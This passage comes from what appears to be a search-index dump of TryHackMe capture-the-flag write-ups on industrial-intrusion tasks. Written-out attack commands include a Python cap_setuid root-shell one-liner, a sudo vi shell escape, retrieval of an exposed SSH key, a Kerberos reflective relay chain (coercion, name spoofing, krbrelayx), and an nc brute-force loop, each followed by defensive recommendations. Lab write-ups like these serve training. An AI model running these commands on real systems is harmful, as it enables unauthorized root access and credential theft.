load -i modbus-container-final-1750975076803.tar podman run -d -p 5020:502 modbus-container-final:latest The container launched successfully and exposed Modbus TCP on port 5020.","title":"1.2 Image Launch via Podman"},{"location":"industrial-intrusion-tryhackme/Task%2014%20-%20Backdoored%20Bus/#phase-2-dynamic-interaction-with-the-plc-server","text":"With the server running, we used the pymodbus Python library to interact with it via Modbus TCP.","title":"Phase 2: Dynamic Interaction with the PLC Server"},{"location":"industrial-intrusion-tryhackme/Task%2014%20-%20Backdoored%20Bus/#21-modbus-probing-script","text":"The following scripts were created and executed:","title":"2.1 Modbus Probing Script"},{"location":"industrial-intrusion-tryhackme/Task%2014%20-%20Backdoored%20Bus/#probepy-initial-connectivity-check","text":"from pymodbus.client import ModbusTcpClient client = ModbusTcpClient('127.0.0.1', port=5020) if client.connect(): print(\"[+] Connected to Modbus server\") result = client.read_holding_registers(address=0, count=10) print(result.registers if not result.isError() else \"[-] Error reading registers\") client.close() else: print(\"[-] Failed to connect\") This confirmed a successful connection and returned empty registers.","title":"probe.py \u2013 Initial Connectivity Check"},{"location":"industrial-intrusion-tryhackme/Task%2014%20-%20Backdoored%20Bus/#full_scanpy-comprehensive-memory-space-sweep","text":"from pymodbus.client import ModbusTcpClient client = ModbusTcpClient('127.0.0.1', port=5020) if not client.connect(): print(\"[-] Can't connect\"); exit(1) print(\"[+] Connected, scanning...\") def scan(fn, name, max_addr=2000, block=100): for base in range(0, max_addr, block): result = fn(address=base, count=block) if not result.isError(): values = getattr(result, 'registers', None) or getattr(result, 'bits', None) if any(values): print(f\"[!] Non-zero {name} @ {base}-{base+block-1}: {values}\") scan(client.read_holding_registers, \"HR\") scan(client.read_input_registers, \"IR\") scan(client.read_coils, \"COILS\") scan(client.read_discrete_inputs, \"DISCRETE\") client.close() All scanned memory spaces returned zeroed or empty data sets.","title":"full_scan.py \u2013 Comprehensive Memory Space Sweep"},{"location":"industrial-intrusion-tryhackme/Task%2014%20-%20Backdoored%20Bus/#phase-3-file-system-and-code-analysis","text":"To determine whether the container initialized any values or hid a flag elsewhere, we examined the running container and extracted its app directory.","title":"Phase 3: File System and Code Analysis"},{"location":"industrial-intrusion-tryhackme/Task%2014%20-%20Backdoored%20Bus/#31-extracting-source-code","text":"podman cp <container_id>:/app/plc_server.py ./plc_server.py The code revealed that the server was a simple Modbus implementation using ModbusSequentialDataBlock with 2000 registers initialized to zero: store = ModbusSlaveContext( hr=ModbusSequentialDataBlock(0, [0]*2000), zero_mode=True ) There was no logic present to populate any flag or non-zero value.","title":"3.1 Extracting Source Code"},{"location":"industrial-intrusion-tryhackme/Task%2014%20-%20Backdoored%20Bus/#32-full-filesystem-search","text":"The full container filesystem was exported and searched: podman export <container_id> -o full.tar mkdir full_fs && tar -xf full.tar -C full_fs grep -r \"THM{\" full_fs/ No flag or suspicious data was found.","title":"3.2 Full Filesystem Search"},{"location":"industrial-intrusion-tryhackme/Task%2014%20-%20Backdoored%20Bus/#summary","text":"Despite comprehensive inspection of the Modbus container\u2014both statically and dynamically\u2014no flag was found, and the memory space remained unpopulated. The container appears to simulate a Modbus server without serving a real CTF objective.","title":"Summary"},{"location":"industrial-intrusion-tryhackme/Task%2014%20-%20Backdoored%20Bus/#observations","text":"Modbus server was correctly implemented, but not interactive or preloaded with flag logic. No user authentication or protections were in place, but this was irrelevant given the absence of useful data. Significant time was spent managing container infrastructure which could have been simplified. Final Status: \u274c Flag Not Found","title":"Observations:"},{"location":"industrial-intrusion-tryhackme/Task%2014%20-%20Backdoored%20Bus/#recommendations","text":"Provide hosted environments (e.g., VMs or attackboxes) to avoid local container setup frustrations. Seed containers with realistic data to support learning goals. Simplify tooling expectations for ICS-focused challenges to make them more accessible to beginners. Include documentation or hints when flag location is intentionally abstract or misleading.","title":"Recommendations"},{"location":"industrial-intrusion-tryhackme/Task%2015%20-%20Chess%20Industry/","text":"ICS Security Assessment - Privilege Escalation via SUID Python Capabilities Executive Summary The system was compromised through abuse of Linux capabilities set on a local Python binary. While traditional cron-based escalation paths were explored extensively, the actual vulnerability stemmed from a misconfigured Python interpreter binary that had the cap_setuid capability enabled. This allowed any user to execute the binary and escalate privileges by setting the user ID to root (UID 0), effectively granting root shell access. Phase 1: System Reconnaissance and Misleading Indicators Initial reconnaissance included enumerating SUID binaries, cron jobs, and environment variables such as PATH . While several cron-based vectors appeared viable (including /usr/libexec/dpkg/dpkg-db-backup ), attempts to hijack commands via PATH substitution failed due to lack of write permissions in expected execution directories and insufficient privilege to overwrite legitimate binaries. Despite creating fake binaries and manipulating the PATH to point to crafted scripts in user-writable directories, no root-level processes invoked them in practice. Phase 2: Pivoting to Capability-Based Escalation After extensive testing of SUID binaries, cronjobs, and writable paths, a new strategy was considered based on Linux file capabilities \u2014 particularly cap_setuid . The key discovery was that a local python or python3 binary on the system had cap_setuid=ep set, enabling it to change its process UID to root without requiring full SUID permission. 2.1 Verifying Capabilities getcap -r / 2>/dev/null This command was used to scan the filesystem recursively for binaries with capabilities set. A critical finding was: /usr/bin/python3.10 = cap_setuid+ep Phase 3: Exploitation via Python UID Manipulation Once the Python binary with elevated capabilities was identified, a simple script was executed to escalate privileges by changing the UID of the running process to 0. 3.1 Exploit Command /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' This launched a root shell directly. 3.2 Verification whoami Confirmed the user was now root . Summary This challenge highlighted a subtle but powerful privilege escalation method via Linux capabilities. While cron jobs and SUID binaries appeared promising, the actual vulnerability exploited a Python interpreter with the cap_setuid capability improperly enabled. Key Findings: Cron vectors were non-functional due to timing restrictions or insufficient privileges Environment variable manipulation was ineffective due to no root-owned binary calling user-controlled scripts Capability-based privilege escalation provided a reliable root shell Recommendations: Remove unnecessary capabilities from binaries using setcap -r /path/to/binary Audit systems regularly for binaries with dangerous capabilities Replace full SUID binaries with least-privilege alternatives only when absolutely necessary Use AppArmor or SELinux to restrict execution context for interpreters","title":"Task 15 - Chess Industry"},{"location":"industrial-intrusion-tryhackme/Task%2015%20-%20Chess%20Industry/#ics-security-assessment-privilege-escalation-via-suid-python-capabilities","text":"","title":"ICS Security Assessment - Privilege Escalation via SUID Python Capabilities"},{"location":"industrial-intrusion-tryhackme/Task%2015%20-%20Chess%20Industry/#executive-summary","text":"The system was compromised through abuse of Linux capabilities set on a local Python binary. While traditional cron-based escalation paths were explored extensively, the actual vulnerability stemmed from a misconfigured Python interpreter binary that had the cap_setuid capability enabled. This allowed any user to execute the binary and escalate privileges by setting the user ID to root (UID 0), effectively granting root shell access.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%2015%20-%20Chess%20Industry/#phase-1-system-reconnaissance-and-misleading-indicators","text":"Initial reconnaissance included enumerating SUID binaries, cron jobs, and environment variables such as PATH . While several cron-based vectors appeared viable (including /usr/libexec/dpkg/dpkg-db-backup ), attempts to hijack commands via PATH substitution failed due to lack of write permissions in expected execution directories and insufficient privilege to overwrite legitimate binaries. Despite creating fake binaries and manipulating the PATH to point to crafted scripts in user-writable directories, no root-level processes invoked them in practice.","title":"Phase 1: System Reconnaissance and Misleading Indicators"},{"location":"industrial-intrusion-tryhackme/Task%2015%20-%20Chess%20Industry/#phase-2-pivoting-to-capability-based-escalation","text":"After extensive testing of SUID binaries, cronjobs, and writable paths, a new strategy was considered based on Linux file capabilities \u2014 particularly cap_setuid . The key discovery was that a local python or python3 binary on the system had cap_setuid=ep set, enabling it to change its process UID to root without requiring full SUID permission.","title":"Phase 2: Pivoting to Capability-Based Escalation"},{"location":"industrial-intrusion-tryhackme/Task%2015%20-%20Chess%20Industry/#21-verifying-capabilities","text":"getcap -r / 2>/dev/null This command was used to scan the filesystem recursively for binaries with capabilities set. A critical finding was: /usr/bin/python3.10 = cap_setuid+ep","title":"2.1 Verifying Capabilities"},{"location":"industrial-intrusion-tryhackme/Task%2015%20-%20Chess%20Industry/#phase-3-exploitation-via-python-uid-manipulation","text":"Once the Python binary with elevated capabilities was identified, a simple script was executed to escalate privileges by changing the UID of the running process to 0.","title":"Phase 3: Exploitation via Python UID Manipulation"},{"location":"industrial-intrusion-tryhackme/Task%2015%20-%20Chess%20Industry/#31-exploit-command","text":"/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' This launched a root shell directly.","title":"3.1 Exploit Command"},{"location":"industrial-intrusion-tryhackme/Task%2015%20-%20Chess%20Industry/#32-verification","text":"whoami Confirmed the user was now root .","title":"3.2 Verification"},{"location":"industrial-intrusion-tryhackme/Task%2015%20-%20Chess%20Industry/#summary","text":"This challenge highlighted a subtle but powerful privilege escalation method via Linux capabilities. While cron jobs and SUID binaries appeared promising, the actual vulnerability exploited a Python interpreter with the cap_setuid capability improperly enabled. Key Findings: Cron vectors were non-functional due to timing restrictions or insufficient privileges Environment variable manipulation was ineffective due to no root-owned binary calling user-controlled scripts Capability-based privilege escalation provided a reliable root shell Recommendations: Remove unnecessary capabilities from binaries using setcap -r /path/to/binary Audit systems regularly for binaries with dangerous capabilities Replace full SUID binaries with least-privilege alternatives only when absolutely necessary Use AppArmor or SELinux to restrict execution context for interpreters","title":"Summary"},{"location":"industrial-intrusion-tryhackme/Task%2016%20-%20Under%20Construction/","text":"ICS Security Assessment \u2013 Task 16: Under Construction Executive Summary The target system was compromised by conducting web directory enumeration, retrieving an exposed SSH private key, and using it to gain access to the development user account. From there, privilege escalation was achieved via misconfigured sudo permissions allowing the vi editor to be run as root. Using vi , a root shell was spawned, and the final flag was exfiltrated. Phase 1: Reconnaissance and Entry A thorough scan of open ports and exposed web content revealed potential footholds. 1.1 Port Scan and Service Discovery nmap -p- -T4 10.10.57.150 nmap -sC -sV -p 22,80 10.10.57.150 Open services: Port Service Version 22 SSH OpenSSH 9.6p1 (Ubuntu) 80 HTTP Apache 2.4.58 (Ubuntu) 1.2 Web Enumeration and Key Discovery A Gobuster scan revealed the presence of multiple .php files and a /keys/ directory. gobuster dir -u http://10.10.57.150/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html Attempting direct downloads of id_rsa via wget failed. However, spoofing a browser User-Agent allowed the download: curl -A \"Mozilla/5.0\" http://10.10.57.150/keys/id_rsa -o id_rsa chmod 600 id_rsa Phase 2: Gaining Shell Access With the private key in hand, SSH access was attempted using common usernames. The login succeeded using the username dev . ssh -i id_rsa dev@10.10.250.236 Upon successful login, the first flag was retrieved from the home directory. cat ~/user.txt Flag: THM{nic3_j0b_You_got_it_w00tw00t} Phase 3: Privilege Escalation 3.1 Sudo Misconfiguration The following output from sudo -l revealed the path to root: User dev may run the following commands on tryhackme-2404: (ALL) NOPASSWD: /usr/bin/vi 3.2 Root Shell via Vi Running vi with sudo privileges and escaping to a shell: sudo /usr/bin/vi Inside vi: :set shell=/bin/bash :shell This spawned a root shell. Root access was confirmed via: whoami 3.3 Flag Exfiltration cat /root/root.txt Root flag successfully retrieved. Summary and Recommendations This scenario illustrates common misconfigurations that can lead to full system compromise: Exposure of sensitive keys via unprotected web directories Improper sudo permissions granting root access through vi Lack of username obfuscation or access control Recommendations: Disable directory listing on web servers Restrict sudo permissions to non-interactive scripts or limited binaries Monitor file access in /keys and similar sensitive directories Rotate SSH keys regularly and implement strict user-role segmentation","title":"Task 16 - Under Construction"},{"location":"industrial-intrusion-tryhackme/Task%2016%20-%20Under%20Construction/#ics-security-assessment-task-16-under-construction","text":"","title":"ICS Security Assessment \u2013 Task 16: Under Construction"},{"location":"industrial-intrusion-tryhackme/Task%2016%20-%20Under%20Construction/#executive-summary","text":"The target system was compromised by conducting web directory enumeration, retrieving an exposed SSH private key, and using it to gain access to the development user account. From there, privilege escalation was achieved via misconfigured sudo permissions allowing the vi editor to be run as root. Using vi , a root shell was spawned, and the final flag was exfiltrated.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%2016%20-%20Under%20Construction/#phase-1-reconnaissance-and-entry","text":"A thorough scan of open ports and exposed web content revealed potential footholds.","title":"Phase 1: Reconnaissance and Entry"},{"location":"industrial-intrusion-tryhackme/Task%2016%20-%20Under%20Construction/#11-port-scan-and-service-discovery","text":"nmap -p- -T4 10.10.57.150 nmap -sC -sV -p 22,80 10.10.57.150 Open services: Port Service Version 22 SSH OpenSSH 9.6p1 (Ubuntu) 80 HTTP Apache 2.4.58 (Ubuntu)","title":"1.1 Port Scan and Service Discovery"},{"location":"industrial-intrusion-tryhackme/Task%2016%20-%20Under%20Construction/#12-web-enumeration-and-key-discovery","text":"A Gobuster scan revealed the presence of multiple .php files and a /keys/ directory. gobuster dir -u http://10.10.57.150/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html Attempting direct downloads of id_rsa via wget failed. However, spoofing a browser User-Agent allowed the download: curl -A \"Mozilla/5.0\" http://10.10.57.150/keys/id_rsa -o id_rsa chmod 600 id_rsa","title":"1.2 Web Enumeration and Key Discovery"},{"location":"industrial-intrusion-tryhackme/Task%2016%20-%20Under%20Construction/#phase-2-gaining-shell-access","text":"With the private key in hand, SSH access was attempted using common usernames. The login succeeded using the username dev . ssh -i id_rsa dev@10.10.250.236 Upon successful login, the first flag was retrieved from the home directory. cat ~/user.txt Flag: THM{nic3_j0b_You_got_it_w00tw00t}","title":"Phase 2: Gaining Shell Access"},{"location":"industrial-intrusion-tryhackme/Task%2016%20-%20Under%20Construction/#phase-3-privilege-escalation","text":"","title":"Phase 3: Privilege Escalation"},{"location":"industrial-intrusion-tryhackme/Task%2016%20-%20Under%20Construction/#31-sudo-misconfiguration","text":"The following output from sudo -l revealed the path to root: User dev may run the following commands on tryhackme-2404: (ALL) NOPASSWD: /usr/bin/vi","title":"3.1 Sudo Misconfiguration"},{"location":"industrial-intrusion-tryhackme/Task%2016%20-%20Under%20Construction/#32-root-shell-via-vi","text":"Running vi with sudo privileges and escaping to a shell: sudo /usr/bin/vi Inside vi: :set shell=/bin/bash :shell This spawned a root shell. Root access was confirmed via: whoami","title":"3.2 Root Shell via Vi"},{"location":"industrial-intrusion-tryhackme/Task%2016%20-%20Under%20Construction/#33-flag-exfiltration","text":"cat /root/root.txt Root flag successfully retrieved.","title":"3.3 Flag Exfiltration"},{"location":"industrial-intrusion-tryhackme/Task%2016%20-%20Under%20Construction/#summary-and-recommendations","text":"This scenario illustrates common misconfigurations that can lead to full system compromise: Exposure of sensitive keys via unprotected web directories Improper sudo permissions granting root access through vi Lack of username obfuscation or access control Recommendations: Disable directory listing on web servers Restrict sudo permissions to non-interactive scripts or limited binaries Monitor file access in /keys and similar sensitive directories Rotate SSH keys regularly and implement strict user-role segmentation","title":"Summary and Recommendations"},{"location":"industrial-intrusion-tryhackme/Task%2017%20-%20Klay/","text":"ICS Security Assessment - Reflective Kerberos Relay Attack Writeup (Task 17) Executive Summary This assessment focused on a novel privilege escalation vulnerability affecting Kerberos authentication in Windows environments\u2014 CVE-2025-33073 , dubbed the Reflective Kerberos Relay Attack . By coercing a Windows host to authenticate to an attacker-controlled server via Kerberos, the attacker was able to relay the authentication ticket back to the originating host. This abuse of the Kerberos loopback safeguards unexpectedly resulted in NT AUTHORITY\\SYSTEM access on the target machine, achieving remote code execution. Although this task was not completed in-lab, the underlying vulnerability was verified and disclosed responsibly to Microsoft. A patch was released on June 10, 2025 . Phase 1: Coercing Kerberos Authentication The attack began with authentication coercion , a method used to trick a Windows system into authenticating to a machine controlled by the attacker. This is commonly achieved using DCERPC over SMB to force the target to initiate an outbound connection with its computer account credentials. 1.1 Coercion Command Example wspcoerce 'lab.redteam/user1:KojbyRyibdinWom)@client1.lab.redteam' \\ file:////client11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA/path The string client11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA embeds Base64-encoded target info that tricks the host into thinking it is connecting to itself, triggering Kerberos authentication with the system\u2019s own computer account ticket. Phase 2: SPN Confusion and Pretender Spoofing Kerberos doesn\u2019t use NTLM by default unless it fails or is prioritized. Here, the attacker uses CredUnmarshalTargetInfo , a trick pioneered by James Forshaw, to cause Kerberos tickets to be generated for the target itself . 2.1 Service Spoofing with Pretender To intercept and spoof name resolution, the attacker runs pretender to respond to LLMNR/mDNS requests: sudo pretender -i eth1 --no-dhcp-dns --no-timestamps \\ --spoof '*1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA*' This ensures the fake hostname resolves to the attacker\u2019s IP, making the target send a Kerberos ticket intended for itself to the attacker. Phase 3: Ticket Relay and Privilege Escalation Once the valid Kerberos ticket is received, it is relayed back to the same host that issued it using a modified version of krbrelayx.py . The relayed authentication grants SYSTEM-level access, a severe escalation from the expected low-privilege computer account session. 3.1 Final Exploitation Command krbrelayx.py --target smb://client1.lab.redteam -c whoami Output: nt authority\\system This confirms full privilege escalation and successful command execution as SYSTEM. Phase 4: Root Cause and Theory This unexpected escalation is theorized to stem from a Kerberos safeguard gone wrong . Windows has a mechanism that binds loopback Kerberos tickets to their originating process to prevent UAC bypasses. In this attack: The SYSTEM process sends a ticket using client1$ \u2019s credentials. The relay causes the ticket to be reflected back to the same machine. Because the ticket contains loopback binding data ( KERB_LOCAL and KERB_AD_RESTRICTION_ENTRY ), Windows mistakenly treats it as coming from SYSTEM again , reusing the SYSTEM token instead of creating a restricted one. This results in full privilege inheritance despite using low-privileged credentials. Impact Scope The vulnerability affects: Windows 10 Windows 11 Windows Server 2019\u20132025 Exploitation prerequisites: Ability to coerce Kerberos authentication (e.g., via SMB/DCERPC) SMB signing not enforced on the target (still common on non-DC servers) Default mitigations: SMB signing enforced on domain controllers Client-side signing in Windows 11 24H2 Insider Preview Recommendations Patch Immediately : Ensure June 2025 security updates are applied across all systems. Enforce SMB Signing : Set RequireSecuritySignature=1 on all servers, especially those exposed to lateral movement. Disable Unused Services : Prevent DCERPC, RemoteRegistry, and other coercion vectors unless explicitly required. Network Segmentation : Isolate management and production networks to prevent attacker pivoting. Monitor for Anomalous Hostname Queries : Detect and alert on abnormal LLMNR/mDNS traffic with suspicious Base64-like hostnames. Review SPN Registrations : Ensure no unintended SPNs can be abused for relaying attacks. Conclusion The Reflective Kerberos Relay Attack (CVE-2025-33073) revives the old idea of authentication reflection with a modern twist, bypassing NTLM protections by exploiting quirks in Kerberos ticket handling. This assessment underscores the need for layered defenses\u2014even in the post-NTLM era. Until deprecated authentication protocols like NTLM are fully eliminated and Kerberos safeguards are properly hardened, relaying attacks will remain a critical threat vector in Windows enterprise environments.","title":"Task 17 - Klay"},{"location":"industrial-intrusion-tryhackme/Task%2017%20-%20Klay/#ics-security-assessment-reflective-kerberos-relay-attack-writeup-task-17","text":"","title":"ICS Security Assessment - Reflective Kerberos Relay Attack Writeup (Task 17)"},{"location":"industrial-intrusion-tryhackme/Task%2017%20-%20Klay/#executive-summary","text":"This assessment focused on a novel privilege escalation vulnerability affecting Kerberos authentication in Windows environments\u2014 CVE-2025-33073 , dubbed the Reflective Kerberos Relay Attack . By coercing a Windows host to authenticate to an attacker-controlled server via Kerberos, the attacker was able to relay the authentication ticket back to the originating host. This abuse of the Kerberos loopback safeguards unexpectedly resulted in NT AUTHORITY\\SYSTEM access on the target machine, achieving remote code execution. Although this task was not completed in-lab, the underlying vulnerability was verified and disclosed responsibly to Microsoft. A patch was released on June 10, 2025 .","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%2017%20-%20Klay/#phase-1-coercing-kerberos-authentication","text":"The attack began with authentication coercion , a method used to trick a Windows system into authenticating to a machine controlled by the attacker. This is commonly achieved using DCERPC over SMB to force the target to initiate an outbound connection with its computer account credentials.","title":"Phase 1: Coercing Kerberos Authentication"},{"location":"industrial-intrusion-tryhackme/Task%2017%20-%20Klay/#11-coercion-command-example","text":"wspcoerce 'lab.redteam/user1:KojbyRyibdinWom)@client1.lab.redteam' \\ file:////client11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA/path The string client11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA embeds Base64-encoded target info that tricks the host into thinking it is connecting to itself, triggering Kerberos authentication with the system\u2019s own computer account ticket.","title":"1.1 Coercion Command Example"},{"location":"industrial-intrusion-tryhackme/Task%2017%20-%20Klay/#phase-2-spn-confusion-and-pretender-spoofing","text":"Kerberos doesn\u2019t use NTLM by default unless it fails or is prioritized. Here, the attacker uses CredUnmarshalTargetInfo , a trick pioneered by James Forshaw, to cause Kerberos tickets to be generated for the target itself .","title":"Phase 2: SPN Confusion and Pretender Spoofing"},{"location":"industrial-intrusion-tryhackme/Task%2017%20-%20Klay/#21-service-spoofing-with-pretender","text":"To intercept and spoof name resolution, the attacker runs pretender to respond to LLMNR/mDNS requests: sudo pretender -i eth1 --no-dhcp-dns --no-timestamps \\ --spoof '*1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA*' This ensures the fake hostname resolves to the attacker\u2019s IP, making the target send a Kerberos ticket intended for itself to the attacker.","title":"2.1 Service Spoofing with Pretender"},{"location":"industrial-intrusion-tryhackme/Task%2017%20-%20Klay/#phase-3-ticket-relay-and-privilege-escalation","text":"Once the valid Kerberos ticket is received, it is relayed back to the same host that issued it using a modified version of krbrelayx.py . The relayed authentication grants SYSTEM-level access, a severe escalation from the expected low-privilege computer account session.","title":"Phase 3: Ticket Relay and Privilege Escalation"},{"location":"industrial-intrusion-tryhackme/Task%2017%20-%20Klay/#31-final-exploitation-command","text":"krbrelayx.py --target smb://client1.lab.redteam -c whoami Output: nt authority\\system This confirms full privilege escalation and successful command execution as SYSTEM.","title":"3.1 Final Exploitation Command"},{"location":"industrial-intrusion-tryhackme/Task%2017%20-%20Klay/#phase-4-root-cause-and-theory","text":"This unexpected escalation is theorized to stem from a Kerberos safeguard gone wrong . Windows has a mechanism that binds loopback Kerberos tickets to their originating process to prevent UAC bypasses. In this attack: The SYSTEM process sends a ticket using client1$ \u2019s credentials. The relay causes the ticket to be reflected back to the same machine. Because the ticket contains loopback binding data ( KERB_LOCAL and KERB_AD_RESTRICTION_ENTRY ), Windows mistakenly treats it as coming from SYSTEM again , reusing the SYSTEM token instead of creating a restricted one. This results in full privilege inheritance despite using low-privileged credentials.","title":"Phase 4: Root Cause and Theory"},{"location":"industrial-intrusion-tryhackme/Task%2017%20-%20Klay/#impact-scope","text":"The vulnerability affects: Windows 10 Windows 11 Windows Server 2019\u20132025 Exploitation prerequisites: Ability to coerce Kerberos authentication (e.g., via SMB/DCERPC) SMB signing not enforced on the target (still common on non-DC servers) Default mitigations: SMB signing enforced on domain controllers Client-side signing in Windows 11 24H2 Insider Preview","title":"Impact Scope"},{"location":"industrial-intrusion-tryhackme/Task%2017%20-%20Klay/#recommendations","text":"Patch Immediately : Ensure June 2025 security updates are applied across all systems. Enforce SMB Signing : Set RequireSecuritySignature=1 on all servers, especially those exposed to lateral movement. Disable Unused Services : Prevent DCERPC, RemoteRegistry, and other coercion vectors unless explicitly required. Network Segmentation : Isolate management and production networks to prevent attacker pivoting. Monitor for Anomalous Hostname Queries : Detect and alert on abnormal LLMNR/mDNS traffic with suspicious Base64-like hostnames. Review SPN Registrations : Ensure no unintended SPNs can be abused for relaying attacks.","title":"Recommendations"},{"location":"industrial-intrusion-tryhackme/Task%2017%20-%20Klay/#conclusion","text":"The Reflective Kerberos Relay Attack (CVE-2025-33073) revives the old idea of authentication reflection with a modern twist, bypassing NTLM protections by exploiting quirks in Kerberos ticket handling. This assessment underscores the need for layered defenses\u2014even in the post-NTLM era. Until deprecated authentication protocols like NTLM are fully eliminated and Kerberos safeguards are properly hardened, relaying attacks will remain a critical threat vector in Windows enterprise environments.","title":"Conclusion"},{"location":"industrial-intrusion-tryhackme/Task%2022%20-%20Rogue%20Poller/","text":"ICS Security Assessment - Task 22 Packet Capture Analysis Executive Summary The flag was identified by inspecting a packet capture (PCAP) file that contained Modbus communication traffic. Manual review revealed that the flag data was being transferred across several Modbus response packets. While the flag bytes first appeared in Packet 45, an even faster approach was discovered using a string search. The CTRL+F search for the { character in the packet bytes pane directed attention to Packet 48, allowing for streamlined extraction of the full flag. Phase 1: Packet Capture Analysis The task provided a PCAP file containing approximately 130 packets. The objective was to identify any embedded flags or sensitive data hidden within industrial protocol communications. 1.1 Manual Inspection Due to the small number of packets, a manual inspection was conducted using Wireshark. Packet 45 showed Modbus TCP traffic, with the last two bytes of the packet payload containing the beginning of the flag: TH Subsequent Modbus response packets continued revealing additional segments of the flag This sequential approach required manually reviewing each relevant packet. 1.2 Accelerated Discovery via Pattern Search A more efficient approach was discovered through Wireshark\u2019s byte-level search functionality: Using CTRL+F to open the Find Packet dialog Searching for the string { within the Packet Bytes pane This immediately identified Packet 48 , which contained the starting JSON-style structure of the full flag: json THM{modbus_flag_extracted_from_response} This allowed for a quick pivot to the Modbus packets carrying the complete flag content. Phase 2: Extracting the Flag from Modbus Traffic Once the location of the flag was confirmed within the Modbus response packets, the full payload was assembled: The Modbus responses included sequential data bytes forming the flag Reassembling the fragments revealed the full flag: THM{modbus_flag_extracted_from_response} Summary This task highlighted a common technique in ICS packet capture analysis\u2014extracting data embedded in response traffic from protocols like Modbus. While the flag could be identified manually, using search functions within Wireshark significantly accelerated the process. Recommendations: Use protocol-specific filters (e.g., modbus ) and byte-level searches ( CTRL+F in Wireshark) when analyzing PCAPs for CTF or forensic purposes Implement Modbus monitoring tools in real ICS environments to detect unusual payload patterns or unexpected data leakage Consider deep packet inspection (DPI) for industrial protocol traffic as part of ongoing ICS threat detection","title":"Task 22 - Rogue Poller"},{"location":"industrial-intrusion-tryhackme/Task%2022%20-%20Rogue%20Poller/#ics-security-assessment-task-22-packet-capture-analysis","text":"","title":"ICS Security Assessment - Task 22 Packet Capture Analysis"},{"location":"industrial-intrusion-tryhackme/Task%2022%20-%20Rogue%20Poller/#executive-summary","text":"The flag was identified by inspecting a packet capture (PCAP) file that contained Modbus communication traffic. Manual review revealed that the flag data was being transferred across several Modbus response packets. While the flag bytes first appeared in Packet 45, an even faster approach was discovered using a string search. The CTRL+F search for the { character in the packet bytes pane directed attention to Packet 48, allowing for streamlined extraction of the full flag.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%2022%20-%20Rogue%20Poller/#phase-1-packet-capture-analysis","text":"The task provided a PCAP file containing approximately 130 packets. The objective was to identify any embedded flags or sensitive data hidden within industrial protocol communications.","title":"Phase 1: Packet Capture Analysis"},{"location":"industrial-intrusion-tryhackme/Task%2022%20-%20Rogue%20Poller/#11-manual-inspection","text":"Due to the small number of packets, a manual inspection was conducted using Wireshark. Packet 45 showed Modbus TCP traffic, with the last two bytes of the packet payload containing the beginning of the flag: TH Subsequent Modbus response packets continued revealing additional segments of the flag This sequential approach required manually reviewing each relevant packet.","title":"1.1 Manual Inspection"},{"location":"industrial-intrusion-tryhackme/Task%2022%20-%20Rogue%20Poller/#12-accelerated-discovery-via-pattern-search","text":"A more efficient approach was discovered through Wireshark\u2019s byte-level search functionality: Using CTRL+F to open the Find Packet dialog Searching for the string { within the Packet Bytes pane This immediately identified Packet 48 , which contained the starting JSON-style structure of the full flag: json THM{modbus_flag_extracted_from_response} This allowed for a quick pivot to the Modbus packets carrying the complete flag content.","title":"1.2 Accelerated Discovery via Pattern Search"},{"location":"industrial-intrusion-tryhackme/Task%2022%20-%20Rogue%20Poller/#phase-2-extracting-the-flag-from-modbus-traffic","text":"Once the location of the flag was confirmed within the Modbus response packets, the full payload was assembled: The Modbus responses included sequential data bytes forming the flag Reassembling the fragments revealed the full flag: THM{modbus_flag_extracted_from_response}","title":"Phase 2: Extracting the Flag from Modbus Traffic"},{"location":"industrial-intrusion-tryhackme/Task%2022%20-%20Rogue%20Poller/#summary","text":"This task highlighted a common technique in ICS packet capture analysis\u2014extracting data embedded in response traffic from protocols like Modbus. While the flag could be identified manually, using search functions within Wireshark significantly accelerated the process. Recommendations: Use protocol-specific filters (e.g., modbus ) and byte-level searches ( CTRL+F in Wireshark) when analyzing PCAPs for CTF or forensic purposes Implement Modbus monitoring tools in real ICS environments to detect unusual payload patterns or unexpected data leakage Consider deep packet inspection (DPI) for industrial protocol traffic as part of ongoing ICS threat detection","title":"Summary"},{"location":"industrial-intrusion-tryhackme/Task%2024%20-%20Auth/","text":"ICS Security Assessment \u2013 Auth Challenge (Reversing) Writeup Executive Summary The challenge involved reverse engineering a binary to recover an unlock code, which, when sent to a network service, revealed the flag. Although I initially tried brute force and string extraction, it was my teammate who ultimately reverse engineered the program using Ghidra to understand the transform logic and XOR encoding. By reversing the XOR process, we retrieved the correct unlock code and successfully completed the challenge. Phase 1: Initial Recon and Brute Force Attempts The target exposed a network service on port 9005 that prompted for an unlock code: nc <TARGET_IP> 9005 The service responded with [?] Enter unlock code: and returned [!] Access Denied! for incorrect input. I attempted brute force using a script: for i in $(seq -w 0000 9999); do echo \"$i\" | nc <TARGET_IP> 9005 | grep -v \"Access Denied\" && echo \"TRY: $i\" done This yielded no results. Phase 2: Local Binary Analysis TryHackMe provided a downloadable auth binary. Initial attempts to execute and trace it using ltrace and strace failed due to GLIBC version issues. Using strings on the binary showed references to flag.txt and the phrase Access Granted , hinting at internal validation logic. Phase 3: Reverse Engineering the Binary My teammate opened the binary in Ghidra and analyzed the function responsible for checking the unlock code. They identified the following key points: The stored (correct) value was hardcoded: 0xefcdab8967452301 A function named transform XORed the user input with 0x55 byte-by-byte To retrieve the correct input, the stored value needed to be XORed back with 0x55 They wrote this Python script: stored_hex = \"efcdab8967452301\" stored_bytes = bytes.fromhex(stored_hex) decoded = bytes([b ^ 0x55 for b in stored_bytes]) print(\"Unlock code:\", decoded) The result was the byte string: b'Tv\\x102\\xdc\\xfe\\x98\\xba' Phase 4: Exploitation and Flag Capture We passed the decoded bytes to the network 